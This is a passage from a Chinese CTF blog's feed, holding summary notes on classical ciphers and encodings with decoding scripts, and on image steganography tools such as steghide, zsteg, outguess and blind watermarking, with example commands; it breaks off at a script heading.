1.19. serpentSerpent是一种对称式分组加密算法，是高级加密标准（AES）的候选者之一，其顺序仅次于Rijndael算法。设计者为罗斯·安德森、艾力·毕汉姆及拉尔斯·克努森。
与其他进入AES评选名单的算法一样，Serpent的区块长度为128比特，支持的密钥长度为128、192和256比特。
在线加解密
1.20. piet与Whitespace，JSFuck等类似，是一种编程语言，不过这个语言的程序是点阵图
可以使用在线解释器
还可以下载源代码npiet-1.3a-win32到本地，然后使用以下命令运行
npiet.exe -tpic solved.png


特点：白底+很多彩色的小像素点组成的图片
1.21. 当铺密码当前汉字有多少笔画出头，对应的明文就是数字几
例子:
密文：王夫 井工 夫口 由中人 井中 夫夫 由中大对应：67 84 70 123 82 77 125


1.22. brainfuckBrainfuck是一种极小化的计算机语言，只使用8种特定的符号
注意内存中也可能会藏有信息，例如2023年羊城杯的GIFuck
在线转换1，在线转换2(可看内存)
例子：
+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;.&lt;++ +[-&gt;+ ++&lt;]&gt; +++++ .&lt;+++ +++++ [-&gt;------- -&lt;]&gt;- -.&lt;++ +++++ [-&gt;++ +++++ &lt;]&gt;++ +++++ +++++ +.&lt;++ +++++ [-&gt;------- &lt;]&gt;-- ----- ----- .&lt;

1.23. BubbleBabble编码特征：五位小写字母一组，以-分割
例子：xipak-herek-serid-bapok-horek-syrox
在线工具
1.24. 阴阳怪气编码特征：[&#39;就 这 ¿ &#39;, &#39;不 会 吧 ？ &#39;]
GitHub项目地址
在线编码解密
1.25. emoji-aes特征：都由表情符号组成
emoji-aes实际上就是aes加密文本，用一个key当作偏移，在表情字典中对应
emoji-aes在线
1.26 codemoji特征是key和密文为表情符号
codemoji-encryptcodemoji-cracker
1.27 solfa-cipher音乐密码
solfa-cipher
1.28 Code Decabit特征：由+和-组成，十位一组
例如：
+-+-++--+- ++---+-++- -+--++-++- +--++-++-- --+++++--- ++-++---+- +++-+-+--- +-+-+---++ ---+++-++- -+--++-++- -+--+++-+- -+--++-++- -+--++-++- ++-+-+-+-- -+--+++-+- ++-++---+- -++++---+- -+--++-++- ++-+-+-+-- +-+++---+- +++-++---- ---+++-++- +-+-+---++ ++-+-+-+-- +-+-+--++- ++--+--++- -++++---+- +---+++-+- ++-+-+-+-- -++++---+- -+--+++-+- +--+-+-++- +++-+-+--- +-+++---+- -+--+-+++- -+--++-++- ---+++-++- ++++----+- -++++---+- -+--+++-+- -+--++-++- ----+++++-

Code Decabit
1.29 DNA编码特征：由ACGT组成
加解密脚本
mapping = &#123;&#x27;AAA&#x27;:&#x27;a&#x27;,&#x27;AAC&#x27;:&#x27;b&#x27;,&#x27;AAG&#x27;:&#x27;c&#x27;,&#x27;AAT&#x27;:&#x27;d&#x27;,&#x27;ACA&#x27;:&#x27;e&#x27;,&#x27;ACC&#x27;:&#x27;f&#x27;,&#x27;ACG&#x27;:&#x27;g&#x27;,&#x27;ACT&#x27;:&#x27;h&#x27;,&#x27;AGA&#x27;:&#x27;i&#x27;,&#x27;AGC&#x27;:&#x27;j&#x27;,&#x27;AGG&#x27;:&#x27;k&#x27;,&#x27;AGT&#x27;:&#x27;l&#x27;,&#x27;ATA&#x27;:&#x27;m&#x27;,&#x27;ATC&#x27;:&#x27;n&#x27;,&#x27;ATG&#x27;:&#x27;o&#x27;,&#x27;ATT&#x27;:&#x27;p&#x27;,&#x27;CAA&#x27;:&#x27;q&#x27;,&#x27;CAC&#x27;:&#x27;r&#x27;,&#x27;CAG&#x27;:&#x27;s&#x27;,&#x27;CAT&#x27;:&#x27;t&#x27;,&#x27;CCA&#x27;:&#x27;u&#x27;,&#x27;CCC&#x27;:&#x27;v&#x27;,&#x27;CCG&#x27;:&#x27;w&#x27;,&#x27;CCT&#x27;:&#x27;x&#x27;,&#x27;CGA&#x27;:&#x27;y&#x27;,&#x27;CGC&#x27;:&#x27;z&#x27;,&#x27;CGG&#x27;:&#x27;A&#x27;,&#x27;CGT&#x27;:&#x27;B&#x27;,&#x27;CTA&#x27;:&#x27;C&#x27;,&#x27;CTC&#x27;:&#x27;D&#x27;,&#x27;CTG&#x27;:&#x27;E&#x27;,&#x27;CTT&#x27;:&#x27;F&#x27;,&#x27;GAA&#x27;:&#x27;G&#x27;,&#x27;GAC&#x27;:&#x27;H&#x27;,&#x27;GAG&#x27;:&#x27;I&#x27;,&#x27;GAT&#x27;:&#x27;J&#x27;,&#x27;GCA&#x27;:&#x27;K&#x27;,&#x27;GCC&#x27;:&#x27;L&#x27;,&#x27;GCG&#x27;:&#x27;M&#x27;,&#x27;GCT&#x27;:&#x27;N&#x27;,&#x27;GGA&#x27;:&#x27;O&#x27;,&#x27;GGC&#x27;:&#x27;P&#x27;,&#x27;GGG&#x27;:&#x27;Q&#x27;,&#x27;GGT&#x27;:&#x27;R&#x27;,&#x27;GTA&#x27;:&#x27;S&#x27;,&#x27;GTC&#x27;:&#x27;T&#x27;,&#x27;GTG&#x27;:&#x27;U&#x27;,&#x27;GTT&#x27;:&#x27;V&#x27;,&#x27;TAA&#x27;:&#x27;W&#x27;,&#x27;TAC&#x27;:&#x27;X&#x27;,&#x27;TAG&#x27;:&#x27;Y&#x27;,&#x27;TAT&#x27;:&#x27;Z&#x27;,&#x27;TCA&#x27;:&#x27;1&#x27;,&#x27;TCC&#x27;:&#x27;2&#x27;,&#x27;TCG&#x27;:&#x27;3&#x27;,&#x27;TCT&#x27;:&#x27;4&#x27;,&#x27;TGA&#x27;:&#x27;5&#x27;,&#x27;TGC&#x27;:&#x27;6&#x27;,&#x27;TGG&#x27;:&#x27;7&#x27;,&#x27;TGT&#x27;:&#x27;8&#x27;,&#x27;TTA&#x27;:&#x27;9&#x27;,&#x27;TTC&#x27;:&#x27;0&#x27;,&#x27;TTG&#x27;:&#x27; &#x27;,&#x27;TTT&#x27;:&#x27;.&#x27;&#125;encode_string = &#x27;OME&#x27;decode_string = &#x27;GGAGCGCTG&#x27;inverted_mapping = dict(zip(mapping.values(), mapping.keys()))def decode_dna( decode_string ):    pieces = []    for i in range( 0, len(decode_string), 3 ):        piece =  decode_string[i:i+3]        ## pieces.append()        pieces.append( mapping[piece] )    return &quot;&quot;.join(pieces)def encode_dna(encode_string):    pieces = []    for i in encode_string:        piece =  inverted_mapping[i]        pieces.append(piece)    return &quot;&quot;.join(pieces)print &#x27;Decoded String is:- &#x27;+ decode_dna(decode_string)print &#x27;Encoded DNA String is:- &#x27;+ encode_dna(encode_string)

1.30. Gronsfeld格罗斯费尔德密码(Gronsfeld cipher)实际上和维吉尼亚密码相同，除了使用了数字来代替字母以外没有什么区别
在线解密
解密脚本
from pycipher import Gronsfeldcipher = &#x27;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&#x27;key = [1,50,61,8,9,20,63,41]secret = Gronsfeld(key).decipher(cipher)print(secret)

1.31. 仿射密码(Affine)例子
gezx&#123;j13p5oznp_1t_z_900y_k3z771h_k001&#125;密钥：a=17 b=77flag&#123;w13e5hake_1s_a_900d_t3a771c_t001&#125;

特点：有两个密钥ab(a是1,3,5,7,9,11,15,17,19,21,23,25中的一个)
在线解密&#x2F;CyberChef也可解
1.32. 希尔密码(hill)希尔密码，是使用基本矩阵论原理的替换密码，现多用于古典密码教学学习。希尔密码，把每个字母当作26进制数字：A&#x3D;0, B&#x3D;1, C&#x3D;2…，Z&#x3D;25， 并把原文字母转换成数字，形成N维向量，跟一个n×n的密钥矩阵相乘，再将计算出的结果模26，即可得到加密密文。用作加密的密钥（即矩阵）必须是可逆的，否则就不可能解密，只有矩阵的行列式和26互质，才是可逆的。
例子
密文：ymyvzjtxswwktetpyvpfmvcdgywktetpyvpfuedfnzdjsiujvpwktetpyvnzdjpfkjssvacdgywktetpyvnzdjqtincduedfpfkjssne密钥：3 4 19 11

特点：密钥是四个数字
在线网站
1.33. 云影密码原理：以0作为分隔符分组，然后把每组数字相加得到一个数字，这个数字对应的就是26字母中的下标
特点：密文只由01248组成
解密脚本
ciphey = &quot;8842101220480224404014224202480122&quot;enc_list = ciphey.split(&#x27;0&#x27;)res = []print(enc_list)for item in enc_list:    sum = 0    for num in item:        sum += int(num)    res.append(chr(sum + 64))print(&#x27;&#x27;.join(res))



1.34. 维吉尼亚(vigenere)密码1、有密文和密钥：
直接用cyberchef或者在线网站解密
2、有密文，没有密钥：
尝试用在线网站爆破
3、有密文，没有密钥，但是知道明文的前几位：
根据对照表，手搓密钥的前几位，找规律
4、给了密钥字典，用脚本爆破
from pycipher import Vigenerecipher = &quot;rla xymijgpf ppsoto wq u nncwel ff tfqlgnxwzz sgnlwduzmy vcyg ib bhfbe u tnaxua ff satzmpibf vszqen eyvlatq cnzhk dk hfy mnciuzj ou s yygusfp bl dq e okcvpa hmsz vi wdimyfqqjqubzc hmpmbgxifbgi qs lciyaktb jf clntkspy drywuz wucfm&quot;with open(&quot;keys.txt&quot;,&quot;r&quot;) as f:    lines = f.readlines()for line in lines:    key = line.strip()    res = Vigenere(key).decipher(cipher)    if &quot;PASSWORD&quot; in res:        print(f&quot;[+] key: &#123;key&#125;&quot;)        print(f&quot;[+] res: &#123;res.lower()&#125;&quot;)

1.35 博多码(Baudot Code)博多码是一种5位编码系统，通常用于电报通信。它有两种模式：字母移位（Letters Shift）和数字移位（Figures Shift），通过特殊的控制字符来切换模式。例如，当遇到特定的移位码时，后续的编码会切换到另一种模式，直到再次切换回来
主要特点是字符用5比特编码，采用两个字符集
解码脚本
letters = &#123;    &#x27;00000&#x27;: &#x27;&#x27;, &#x27;00001&#x27;: &#x27;E&#x27;, &#x27;00010&#x27;: &#x27;&#x27;, &#x27;00011&#x27;: &#x27;A&#x27;, &#x27;00100&#x27;: &#x27; &#x27;,    &#x27;00101&#x27;: &#x27;S&#x27;, &#x27;00110&#x27;: &#x27;I&#x27;, &#x27;00111&#x27;: &#x27;U&#x27;, &#x27;01000&#x27;: &#x27;&#x27;, &#x27;01001&#x27;: &#x27;D&#x27;,    &#x27;01010&#x27;: &#x27;R&#x27;, &#x27;01011&#x27;: &#x27;J&#x27;, &#x27;01100&#x27;: &#x27;N&#x27;, &#x27;01101&#x27;: &#x27;F&#x27;, &#x27;01110&#x27;: &#x27;C&#x27;,    &#x27;01111&#x27;: &#x27;K&#x27;, &#x27;10000&#x27;: &#x27;T&#x27;, &#x27;10001&#x27;: &#x27;Z&#x27;, &#x27;10010&#x27;: &#x27;L&#x27;, &#x27;10011&#x27;: &#x27;W&#x27;,    &#x27;10100&#x27;: &#x27;H&#x27;, &#x27;10101&#x27;: &#x27;Y&#x27;, &#x27;10110&#x27;: &#x27;P&#x27;, &#x27;10111&#x27;: &#x27;Q&#x27;, &#x27;11000&#x27;: &#x27;O&#x27;,    &#x27;11001&#x27;: &#x27;B&#x27;, &#x27;11010&#x27;: &#x27;G&#x27;, &#x27;11011&#x27;: &#x27;&#x27;, &#x27;11100&#x27;: &#x27;M&#x27;, &#x27;11101&#x27;: &#x27;X&#x27;,    &#x27;11110&#x27;: &#x27;V&#x27;, &#x27;11111&#x27;: &#x27;&#x27;&#125;figures = &#123;    &#x27;00000&#x27;: &#x27;&#x27;, &#x27;00001&#x27;: &#x27;3&#x27;, &#x27;00010&#x27;: &#x27;&#x27;, &#x27;00011&#x27;: &#x27;-&#x27;, &#x27;00100&#x27;: &#x27; &#x27;,    &#x27;00101&#x27;: &#x27;&#x27;, &#x27;00110&#x27;: &#x27;8&#x27;, &#x27;00111&#x27;: &#x27;7&#x27;, &#x27;01000&#x27;: &#x27;&#x27;, &#x27;01001&#x27;: &#x27;$&#x27;,    &#x27;01010&#x27;: &#x27;4&#x27;, &#x27;01011&#x27;: &quot;&#x27;&quot;, &#x27;01100&#x27;: &#x27;,&#x27;, &#x27;01101&#x27;: &#x27;!&#x27;, &#x27;01110&#x27;: &#x27;:&#x27;,    &#x27;01111&#x27;: &#x27;(&#x27;, &#x27;10000&#x27;: &#x27;5&#x27;, &#x27;10001&#x27;: &#x27;&quot;&#x27;, &#x27;10010&#x27;: &#x27;)&#x27;, &#x27;10011&#x27;: &#x27;2&#x27;,    &#x27;10100&#x27;: &#x27;#&#x27;, &#x27;10101&#x27;: &#x27;6&#x27;, &#x27;10110&#x27;: &#x27;0&#x27;, &#x27;10111&#x27;: &#x27;1&#x27;, &#x27;11000&#x27;: &#x27;9&#x27;,    &#x27;11001&#x27;: &#x27;?&#x27;, &#x27;11010&#x27;: &#x27;&amp;&#x27;, &#x27;11011&#x27;: &#x27;&#x27;, &#x27;11100&#x27;: &#x27;.&#x27;, &#x27;11101&#x27;: &#x27;/&#x27;,    &#x27;11110&#x27;: &#x27;;&#x27;, &#x27;11111&#x27;: &#x27;&#x27;&#125;# 分割二进制序列为5位一组binary_groups = &quot;001000011010000001001001100011001010010000011001001101110000000111111111001001101000000100011101100001001000010010010000101000001110000001001100100001011100001111100000010010001111011001100010011011000010000011001010010010000101000000100100001100110010000000010101001100000111000000110110000110000011100100010010000000011001000001110100101000011101101010000100000111001010110101000001111001000011000000100011001100000100110111011111111001001101101111111110011010000000111101110111100101110011111001000010111100000110101010000001001010111000001110010010100000111111000001001000110111000001110110001001001001000010100001100010100100101101001000011011100000100100000110110001001001001000010100000010010001101100100001111010001000011000101001000101100111110111000011111100001101100011111110001111011000111111101101110111011111111111100000111011101011111100110100001101100011110001111100011111000000100010&quot;groups = [binary_groups[i:i+5] for i in range(0, len(binary_groups), 5)]current_mode = &#x27;letters&#x27;result = []for code in groups:    if current_mode == &#x27;letters&#x27;:        if code == &#x27;11011&#x27;:  # 遇到FS切换到数字模式            current_mode = &#x27;figures&#x27;            continue        elif code == &#x27;11111&#x27;:  # LS无需处理            continue        result.append(letters[code])    elif current_mode == &#x27;figures&#x27;:        if code == &#x27;11111&#x27;:  # 遇到LS切换回字母模式            current_mode = &#x27;letters&#x27;            continue        result.append(figures[code])decoded = &#x27;&#x27;.join(result).lower()print(decoded)




图形密码这一部分较简单，对着表翻译就好，但也比较抽象，因为时常会出现奇奇怪怪的东西
2.1. 跳舞的小人找到了三种不同的表，将密文与表一一对应即可（好像出自福尔摩斯）



2.2. 猪圈密码猪圈密码在线转换

以下几张是变种猪圈



2.3. 圣堂武士密码圣堂武士密码其实也是变种猪圈，不过比较有名

2.4. 银河字母
2.5. 凹凸字体
2.6. 夏多密码（曲折密码）来源：作者麦克斯韦·格兰特在中篇小说《死亡之链》塑造夏多这一英雄人物中所自创的密码整个夏多密码由两部分组成，码表和旋转方向


最后四个符号（1，2，3，4）可以出现在密文中的任意位置，它代表着在此之后的密文需要向什么方向旋转
2.7. 古埃及象形文字

2.8. 费兹象形文字
2.9. Flag Semaphore旗语
2.10. 船用信号旗
2.11. Dvorak键盘加密
利用两种键盘字母的排列顺序不同，进行的一种替换加密方式。

Dvorak键盘，中文名字是德沃夏克键盘，由奥古斯特·德沃夏克和威廉·迪利在1930年代期间设计


other各种奇奇怪怪又抽象的实在太多了，可以参考下面两篇文章中的字符表https://www.cnblogs.com/Nuy0ah/p/16138118.htmlhttps://www.bilibili.com/read/cv19369626/
部分脚本参考：CTF-Misc Guide
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>总结</tag>
        <tag>编码</tag>
        <tag>密码</tag>
      </tags>
  </entry>
  <entry>
    <title>misc总结(隐写篇)</title>
    <url>/posts/b9152a17/</url>
    <content><![CDATA[文中使用的linux工具大部分都可以在CTF_misc_auto_deploy中一键下载到本地
图片类0x01 Exif信息隐藏可交换图像文件格式简称exif，可以记录图片的属性信息和拍摄数据。Exif信息是可以被任意编辑的
root@lewiserii-pc:~/桌面# exiftool 1.pngExifTool Version Number         : 11.88File Name                       : 1.pngDirectory                       : .File Size                       : 5.4 kBFile Modification Date/Time     : 2023:02:21 13:47:49+08:00File Access Date/Time           : 2023:02:21 13:54:17+08:00File Inode Change Date/Time     : 2023:02:21 13:53:15+08:00File Permissions                : rwxrw-rw-File Type                       : PNGFile Type Extension             : pngMIME Type                       : image/pngImage Width                     : 438Image Height                    : 121Bit Depth                       : 8Color Type                      : RGBCompression                     : Deflate/InflateFilter                          : AdaptiveInterlace                       : NoninterlacedPixels Per Unit X               : 5669Pixels Per Unit Y               : 5669Pixel Units                     : metersSoftware                        : SnipasteImage Size                      : 438x121Megapixels                      : 0.053

提取缩略图
exiftool -b -ThumbnailImage attachment.jpg &gt;flag.jpg
0x02 文件修复文件头(尾)被修改或去除，需要修复文件格式
可以借助010 editor的模板 很好用
或者可以自己创建一个文件来比较修改的部分
0x03 文件附加在正常图片中插入额外的文件数据
使用工具binwalk，foremost，dd提取出来
root@lewiserii-pc:~/桌面# binwalk -e 1.pngDECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             PNG image, 438 x 121, 8-bit/color RGB, non-interlaced91            0x5B            Zlib compressed data, default compressionroot@lewiserii-pc:~/桌面# foremost 1.pngProcessing: 1.png|*|

如果检测到附加的数据，binwalk会在当前目录下生成一个_[文件名].extracted目录，foremost会生成一个output目录
在复杂一点的数据插入需要手动提取或使用脚本
0x04 cloacked-pixel(需要passwd)lsb隐写的一种支持PNG，JPG，BMP等图片格式
隐写后会转为PNG
#lsb.py 98 linesteg_img.save(imgFile + &quot;-stego.png&quot;, &quot;PNG&quot;)

加密
$ python lsb.py hide samples/orig.jpg samples/secret.zip p@$5w0rD[*] Input image size: 640x425 pixels.[*] Usable payload size: 99.61 KB.[+] Payload size: 74.636 KB[+] Encrypted payload size: 74.676 KB[+] samples/secret.zip embedded successfully!

解密
$ python lsb.pyLSB steganogprahy. Hide files within least significant bits of images.Usage:  lsb.py hide &lt;img_file&gt; &lt;payload_file&gt; &lt;password&gt;  lsb.py extract &lt;stego_file&gt; &lt;out_file&gt; &lt;password&gt;  lsb.py analyse &lt;stego_file&gt;

0x05 steghide(可需要passwd)steghide可以将数据隐藏在图像和音频文件中
加密
# 将secret.txt文件隐藏到text.jpg中steghide embed -cf test.jpg -ef secret.txt -p 123456

解密
steghide extract -sf out.jpg -p 123456

有些题目需要爆破steghide的密码，可以使用pyhton脚本或stegseek工具
# 不指定wordlist.txt时自动使用`rockyou.txt`（如果系统中有，没有会报错）stegseek [stegofile.jpg] [wordlist.txt]

0x06 F5-steganography(需要passwd)F5隐写可以将文件嵌入到BMP、GIF或JPEG图像中，需要java环境
加密
java Embed 原图.jpg 生成图.jpg -e 隐藏的文件.txt -p &#x27;密码&#x27;

解密
java Extract out.jpg -p &#x27;密码&#x27;

特征

0x07 zsteglsb隐写，与steghide类似，可以检测PNG和BMP中的隐藏数据隐藏数据，可以快速提取隐藏信息
zsteg -a &lt;文件名&gt;zsteg -e b8,a,lsb,xy 文件.png -&gt; out.png

0x07 outguess(可需要passwd)加密
outguess -k &#x27;密码&#x27; -d &lt;需要隐藏的内容&gt; 1.jpg 2.jpg# 1.jpg会覆盖2.jpg

解密
outguess -k &#x27;密码&#x27; -r &lt;加密的图片&gt;  -t &lt;输出保存的文件&gt;

0x08 盲水印水印又分为单图水印和双图水印
单图水印是指只需要一张图片就能提取出隐藏的信息，双图需要两张图片（一般是原图和加密后的图片，通常两张图片看上去是一样的）
# blindwatermark双图盲水印python2 bwm.py encode 原图.png 水印图.png 有盲水印的图.pngpython2 bwm.py decode 原图.png 有盲水印的图.png 反解出来的水印图.pngpython3 bwmforpy3.py decode 原图.png 有盲水印的图.png 反解出来的水印图.pngpython3 bwmforpy3.py decode 原图.png 有盲水印的图.png 反解出来的水印图.png --oldseed


还有一种特殊的盲水印：频域盲水印
import cv2import numpy as npimport randomimport osfrom argparse import ArgumentParserALPHA = 5def build_parser():    parser = ArgumentParser()    parser.add_argument(&#x27;--original&#x27;, dest=&#x27;ori&#x27;, required=True)    parser.add_argument(&#x27;--image&#x27;, dest=&#x27;img&#x27;, required=True)    parser.add_argument(&#x27;--result&#x27;, dest=&#x27;res&#x27;, required=True)    parser.add_argument(&#x27;--alpha&#x27;, dest=&#x27;alpha&#x27;, default=ALPHA)    return parserdef main():    parser = build_parser()    options = parser.parse_args()    ori = options.ori    img = options.img    res = options.res    alpha = options.alpha    if not os.path.isfile(ori):        parser.error(&quot;original image %s does not exist.&quot; % ori)    if not os.path.isfile(img):        parser.error(&quot;image %s does not exist.&quot; % img)    decode(ori, img, res, alpha)def decode(ori_path, img_path, res_path, alpha):    ori = cv2.imread(ori_path)    img = cv2.imread(img_path)    ori_f = np.fft.fft2(ori)    img_f = np.fft.fft2(img)    height, width = ori.shape[0], ori.shape[1]    watermark = (ori_f - img_f) / alpha    watermark = np.real(watermark)    res = np.zeros(watermark.shape)    random.seed(height + width)    x = range(height / 2)    y = range(width)    random.shuffle(x)    random.shuffle(y)    for i in range(height / 2):        for j in range(width):            res[x[i]][y[j]] = watermark[i][j]    cv2.imwrite(res_path, res, [int(cv2.IMWRITE_JPEG_QUALITY), 100])if __name__ == &#x27;__main__&#x27;:    main()

使用
python pinyubwm.py --original 1.png --image 2.png --result out.png
0x09 gnuplotgnuplot可以把坐标画出来
坐标格式：number number
plot &quot;1.txt&quot;


0x10 拼图montage+gaps可以将小图片还原成大图片
先用montage组合图片
montage input_file -tile 8X6 -geometry +0+0 output_file

input_file：可以一张一张指定，也能使用正则匹配(*.png)-geometry +0+0：使图片之间没有间隙-tile 8X6：以8行6列排列output_file：输出文件
gaps用来还原montage命令创建的乱序图像
gaps --image=out.jpg --generations=50 --population=120 --size=50--image            指向拼图的路径--size            拼图块的像素尺寸（如果不能明确提供--size的参数，拼图块尺寸将自适应调整）--generations    遗传算法的代的数量--population    个体数量--verbose        每一代训练结束后展示最佳结果--save            将拼图还原为图像


            最近gaps更新了命令变成了gaps run 目标图片 生成图片 参数例如：gaps run 1.png  2.png –generations&#x3D;60 –population&#x3D;100
          




montage+gaps适用于大小相同，数量小的拼图。复杂的需要注意图片名或其他地方是否有顺序提示，还可以注意图片中的冗余位是否可能包含坐标数据
0x11 pngcheckwindows工具，用来检查IDAT块
0x12 webp
webp图片是一种同时提供了有损压缩与无损压缩（可逆压缩）的图片文件格式。webp最初在2010年发布，目标是减少文件大小，但达到和JPEG格式相同的图片质量，希望能够减少图片在网络上的发送时间。

webp工具官方文档
cwebp - 将图片文件压缩为 WebP 文件cwebp 1.png -o 2.webpdwebp - 将 WebP 文件解压缩到图片文件dwebp 1.webp -o 2.pnggif2webp - 将 GIF 图片转换为 WebP 格式gif2webp 1.gif -o 2.webpvwebp - 解压缩 WebP 文件，然后在窗口中显示该文件vwebp 1.webpwebpinfo - 输出 WebP 文件的区块级结构以及基本完整性检查webpinfo 1.webp

0x13 stegpy(可需要passwd)加密
stegpy &#x27;hello_world&#x27; image.pngstegpy &quot;hello_world&quot; image.png -p   //需要密码

解密
stegpy _image.pngstegpy _image.png -p  //需要密码

0x14 二维码二维码类的题目需要对二维码的生成原理有深入了解
CTF中二维码题目及答题技巧总结（一）
可能有以下考点
1：修复二维码
可能给了一张常规的二维码，但是没有定位符，就需要自己画上去，或者一个大二维码打乱成数个小的二维码，需要还原
2：与数织结合
例如祥云杯的shuffle_code
3：奇奇怪怪的变种二维码
推荐cortexScan和中国编码识别
0x14 GIFlinux下分帧
convert flag.gif flag.png


1：可能在某一帧上有字符
2：帧间隔的秒数
可以用identify分析，如果是两种数字重复可以当二进制转字符串
# 显示序号identify -format &quot;%s %T \n&quot; 1.gif# 不显示序号identify -format &quot;%T\n&quot;

0x15 等距提取像素例如2024浙江省赛决赛-天命人
以 (5,5) 为起点，每隔 10 像素取一个像素点，生成一个宽高约为原图 1&#x2F;10 的”抽样缩小图”
from PIL import Imagea = Image.open(&quot;金箍棒.png&quot;)x, y = 5, 5x_, y_ = 0, 0w, h = a.sizeb = Image.new(a.mode, (w // 10, h // 10))for x in range(5, w, 10):    for y in range(5, h, 10):        print(x, y, x_, y_)        b.putpixel((x_, y_), a.getpixel((x, y)))        y_ += 1    x_ += 1    y_ = 0b.save(&#x27;1.png&#x27;)

或者使用Byxs20的代码
import osimport reimport cv2import argparseimport itertoolsimport numpy as npparser = argparse.ArgumentParser()parser.add_argument(&#x27;-f&#x27;, type=str, default=None, required=True,                    help=&#x27;输入文件名称&#x27;)parser.add_argument(&#x27;-p&#x27;, type=str, default=None, required=True,                    help=&#x27;输入左上顶点和右下顶点坐标 (如:-p 220x344+3520x2150)&#x27;)parser.add_argument(&#x27;-n&#x27;, type=str, default=None, required=True,                    help=&#x27;输入宽度间隔和高度间隔 (如:-n 44x86)&#x27;)parser.add_argument(&#x27;-size&#x27;, type=str, default=&#x27;1x1&#x27;, required=False,                    help=&#x27;输入截取图像的大小 (如:-size 7x7)&#x27;)parser.add_argument(&#x27;-resize&#x27;, type=int, default=1, required=False,                    help=&#x27;输入截取图像放大倍数 (如:-resize 1)&#x27;)args  = parser.parse_args()if __name__ == &#x27;__main__&#x27;:    if re.search(r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;\+\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;, args.p) and re.search(r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;, args.n) and re.search(r&quot;^\d&#123;1,&#125;x\d&#123;1,&#125;$&quot;, args.size):        x1, y1 = map(lambda x: int(x), args.p.split(&quot;+&quot;)[0].split(&quot;x&quot;))        x2, y2 = map(lambda x: int(x), args.p.split(&quot;+&quot;)[1].split(&quot;x&quot;))        width, height = map(lambda x: int(x), args.n.split(&quot;x&quot;))        width_size, height_size = map(lambda x: int(x), args.size.split(&quot;x&quot;))        img_path = os.path.abspath(args.f)        file_name = img_path.split(&quot;\\&quot;)[-1]        img = cv2.imread(img_path, cv2.IMREAD_COLOR)        row, col = img.shape[:2]        r, c = len(range(y1, y2 + 1, height)), len(range(x1, x2 + 1, width))        new_img = np.zeros(shape=(r * height_size * args.resize, c * width_size * args.resize, 3))        for y, x in itertools.product(range(r), range(c)):            for y_size in range(height_size):                for x_size in range(width_size):                    # new_img[y * height_size + y_size, x * width_size + x_size] = img[y1 + y * height + y_size, x1 + x * width + x_size]                    pt1 = ((x * width_size + x_size) * args.resize, (y * height_size + y_size) * args.resize)                    pt2 = ((x * width_size + x_size) * args.resize + args.resize, (y * height_size + y_size) * args.resize + args.resize)                    color = img[y1 + y * height + y_size, x1 + x * width + x_size].tolist()                    cv2.rectangle(new_img, pt1=pt1, pt2=pt2, color=color, thickness=-1)                    cv2.imwrite(f&quot;_&#123;file_name&#125;&quot;, new_img)        print(&quot;已保存到运行目录中...&quot;)    else:        print(&quot;参数-p或参数-n或参数-size, 输入错误!&quot;)

python3 Get_Pixels.py -f 1.png -p 5x5+1915x1075 -n 10x10# python3 main.py -f 要解密的图片 -p 第一个像素点的XY坐标+最后一个像素点的XY坐标 -n 两个等距像素点的XY距离的差值


0x16 PixelJihadgithub项目地址
在线解密
例如 第三届”红明谷”杯网络安全大赛-阿尼亚
0x16 Arnold猫脸变换利用Arnold变换（又称猫脸变换）可以对图像进行置乱，使得原本有意义的图像变成一张无意义的图像。该变换可以在其它图像处理前对图像做预处理，例如在数字盲水印嵌入前对水印进行置乱。也可以用于普通的图像加密。 通常一次Arnold变换达不到理想效果，需要对图像进行连续多次的变换。Arnold变换具有周期性，即对图像连续进行Arnold变换，最终又能得到原图像。变换的周期和图像的尺寸有关。 当图像是一张方形的图像时，Arnold变换存在逆变换。经过N次Arnold变换后的数据可以通过N次逆变换恢复数据。 Arnold变换不仅可以用于图像置乱，也可以用于其它数据的置乱和加密。
已知shuffle_times，a和b参数的恢复脚本：
# -*- coding: utf-8 -*-# @Author  : 1cePeakimport matplotlib.pyplot as pltimport cv2import numpy as npfrom PIL import Imageimg = cv2.imread(&#x27;flag.png&#x27;)def arnold_encode(image, shuffle_times, a, b):    &quot;&quot;&quot; Arnold shuffle for rgb image    Args:        image: input original rgb image        shuffle_times: how many times to shuffle    Returns:        Arnold encode image    &quot;&quot;&quot;    # 1:创建新图像    arnold_image = np.zeros(shape=image.shape)    # 2：计算N    h, w = image.shape[0], image.shape[1]    N = h   # 或N=w    # 3：遍历像素坐标变换    for time in range(shuffle_times):        for ori_x in range(h):            for ori_y in range(w):                # 按照公式坐标变换                new_x = (1*ori_x + b*ori_y)% N                new_y = (a*ori_x + (a*b+1)*ori_y) % N                # 像素赋值                # print(image[ori_x, ori_y, :])                # print(arnold_image[new_x, new_y, :])                arnold_image[new_x, new_y, :] = image[ori_x, ori_y, :]        # 更新坐标        image = np.copy(arnold_image)    cv2.imwrite(&#x27;flag_arnold_encode.png&#x27;, arnold_image, [int(cv2.IMWRITE_PNG_COMPRESSION), 0])    return arnold_imagedef arnold_decode(image, shuffle_times, a, b):    &quot;&quot;&quot; decode for rgb image that encoded by Arnold    Args:        image: rgb image encoded by Arnold        shuffle_times: how many times to shuffle    Returns:        decode image    &quot;&quot;&quot;    # 1:创建新图像    decode_image = np.zeros(shape=image.shape)    # 2：计算N    h, w = image.shape[0], image.shape[1]    N = h  # 或N=w    # 3：遍历像素坐标变换    for time in range(shuffle_times):        for ori_x in range(h):            for ori_y in range(w):                # 按照公式坐标变换                new_x = ((a * b + 1) * ori_x + (-b) * ori_y) % N                new_y = ((-a) * ori_x + ori_y) % N                decode_image[new_x, new_y, :] = image[ori_x, ori_y, :]    cv2.imwrite(&#x27;flag.png&#x27;, decode_image, [int(cv2.IMWRITE_PNG_COMPRESSION), 0])    return decode_image# arnold_encode(img, 1, 2, 3)arnold_decode(img, 1, 29294, 7302244)

已知a,b 不知道翻转次数爆破脚本
